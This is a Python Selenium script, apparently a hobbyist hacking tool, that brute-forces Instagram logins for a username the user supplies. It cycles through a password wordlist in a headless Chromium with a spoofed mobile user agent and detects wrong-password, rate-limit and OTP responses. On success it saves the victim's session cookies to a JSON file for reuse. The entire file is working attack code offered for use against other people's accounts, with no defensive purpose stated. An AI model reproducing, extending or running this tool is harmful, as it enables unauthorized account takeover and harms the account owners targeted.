import os
import time
import json
import shutil
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

os.system('cls' if os.name == 'nt' else 'clear')


wh = "\033[1;97m"
cy = "\033[1;96m"
pr = "\033[1;95m"
bl = "\033[1;94m"
og = "\033[1;93m"
gr = "\033[1;92m"
rd = "\033[1;91m"
rs = "\033[0m"


logo = fr"""{cy}

      ,_    /) (\    _,
       >>  <<,_,>>  <<
      //   _0.-.0_   \\
      \'._/       \_.'/         ____  _   _  ____ _  _____ _   _ ____ _____
       '-.\.--.--./.-'         / ___|| | | |/ ___| |/ /_ _| \ | / ___|_   _|
        __/:: Y ::\__          \___ \| | | | |   | ' / | ||  \| \___ \ | |
';,  .-(_|:: :|: ::|_)-.  ,:'   ___) | |_| | |___| . \ | || |\  |___) || |
  \\/.'  |:: :|: ::|  `.\//    |____/ \___/ \____|_|\_\___|_| \_|____/ |_|
   (/    |:: :|: ::|    \)
        /\:: :|: ::/\           {wh}/{og}Instagram Brute-Force & Session Manager{cy}
       (_/'::.:.::'\_)          {wh}/{og}Version  {wh}: 1.3{cy}
        \\ ""'*'"" //           {wh}/{og}Cr       {wh}: SuzukaNizar{cy}
         \\       //
          ':.   .:'
{rs}"""

print(logo)
print(" " * 27,wh+"‾‾" ,wh+"‾"*14,wh+"‾‾"+rs)


print()
username = input(f"{cy}[{og}?{cy}] {wh}INSTAGRAM USERNAME: ")
wordlist = input(f"{cy}[{og}?{cy}] {wh}PASSWORD LIST FILE: ")

try:
  with open(wordlist, "r", encoding="utf-8") as file:
    pw_list = [line.strip() for line in file.readlines() if line.strip()]
except FileNotFoundError:
  print()
  print(f"{wh}[{bl}INFO{wh}] {og}{wordlist} file not found.{rs}")
  print()
  exit()

session_file = f"session_{username}.json"

# CONFIG ELEMEN INSTAGRAM
login_url = "https://instagram.com"
input_usrnm = "username"
input_pass = "password"
sbmt_btn_xpath = "//button[@type='submit']"

# INISIALISASI BROWSER
options = webdriver.ChromeOptions()
# termux mode --headless dan --no-sandbox
options.add_argument('--headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
# penyamaran user agent
options.add_argument('--user-agent=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36')

chrome_path = shutil.which("chromium") or shutil.which("chromium-browser") or "/data/data/com.termux/files/usr/bin/chromium"
options.binary_location = chrome_path

print()
print(f"{wh}[{pr}SYST{wh}] open a secure browser...{rs}")

driver_path = shutil.which("chromedriver") or "/data/data/com.termux/files/usr/bin/chromedriver"
  
#menghubungkan Selenium ke biner ChromeDriver
service = Service(executable_path=driver_path)
driver = webdriver.Chrome(service=service, options=options)
wait = WebDriverWait(driver, 15)

if os.path.exists(session_file):
  print(f"{wh}[{bl}INFO{wh}] {gr}found old session files.{rs}")
  driver.get("https://instagram.com")
  time.sleep(3)

  try:
    with open(session_file, "r") as f:
      cookies = json.load(f)
      for flour in cookies:
        driver.add_cookie(flour)

      #refresh page
      driver.refresh()
      time.sleep(5)

      if "accounts/login" not in driver.current_url:
        print(f"{wh}[{bl}INFO{wh}] {gr}SESSION VALID!{wh}: you have entered the account.{rs}")
        print(f"{wh}[{pr}SYST{wh}] {og}close the program.{rs}")
        driver.quit()
        exit()
  except Exception as e:
    print(f"{wh}[{bl}INFO{wh}] {rd}SESSION INVALID!{wh}: {og}continued with the brute force method.{rs}")


print()
print(f"{" " * 21}{wh}{"-" * 7}{gr} BRUTE FORCE PROCESS {wh}{"-" * 7}{rs}")
print()

driver.get(login_url)

for i, pwd in enumerate(pw_list, 1):
  timer = datetime.now()
  starting = time.time()
  print(f"{wh}>>> {cy}{i} {wh}/ {cy}{len(pw_list)}")
  print(f"{wh}[{gr}TEST{wh}] {og}try using password{wh}: {pwd}{rs}")

  try:
    un_elmt = wait.until(EC.presence_of_element_located((By.NAME, input_usrnm)))
    ps_elmt = driver.find_element(By.NAME, input_pass)
    st_elmt = driver.find_element(By.XPATH, sbmt_btn_xpath)

    un_elmt.clear()
    un_elmt.send_keys(username)
    ps_elmt.clear()
    ps_elmt.send_keys(pwd)

    time.sleep(1)
    st_elmt.click()

    time.sleep(5)

    current_url = driver.current_url
    dura_time = round(time.time() - starting, 2)

    if "accounts/login" not in current_url and "://instagram.com" in current_url:
      print(f"{wh}[{bl}INFO{wh} {gr}LOGIN SUCCESSFULL!")
      print(f"       {wh}~{gr}password used  {wh}:  {pwd}")
      print(f"       {wh}~{gr}start time  {wh}  :  {timer.strftime('%H:%M:%S')}")
      print(f"       {wh}~{gr}test duration  {wh}:  {dura_time} seconds")
      print(f"       {wh}~{gr}web response  {wh}: {current_url} {gr}(success){rs}")

      print(f"{wh}[{bl}INFO{wh}] the session will be secured as a file.{rs}")
      cookies = driver.get_cookies()
      with open(session_file, "w") as f:
        json.dump(cookies, f)
      print(f"{wh}[{pr}SYST{wh}] {gr}session successfully secured!{rs}")
      break

    else:
      page_text = driver.page_source.lower()
      dura_time = round(time.time() - starting, 2)

      if "salah" in page_text or "incorrect" in page_text:
        msg = "password incorrect!"
      elif "terlalu sering" in page_text or "too many requests" in page_text or "429" in page_text:
        msg = "rate limit exceeded!"
      elif "checkpoint" in page_text or "challenge" in page_text or "verifikasi" in page_text:
        msg = "account asks OTP code!"
      else:
        msg = "rejected / unknown response!"

      print(f"{wh}[{bl}INFO{wh}] {og} LOGIN FAILED!")
      print(f"       {wh}~{og}start time  {wh}:  {timer.strftime('%H:%M:%S')}")
      print(f"       {wh}~{og}test duration  {wh}:  {dura_time} seconds")
      print(f"       {wh}~{og}web response  {wh}:  {msg}{rs}")

  except Exception as e:
    dura_time = round(time.time() - starting, 2)
    print(f"{wh}[{bl}INFO{wh}] {rd}ERROR SYSTEM!")
    print(f"       {wh}~{rd}test duration  {wh}:  {dura_time} seconds")
    print()
    print(f"{wh}={rs}" * 75)

print()
print(f"{" " * 21}{wh}{"-" * 7} {gr}PROCESS IS COMPLETE!{wh} {"-" * 7}{rs}")
print()
print(f"{wh}[{pr}SYST{wh}] browser closed.{rs}")
print()
driver.quit()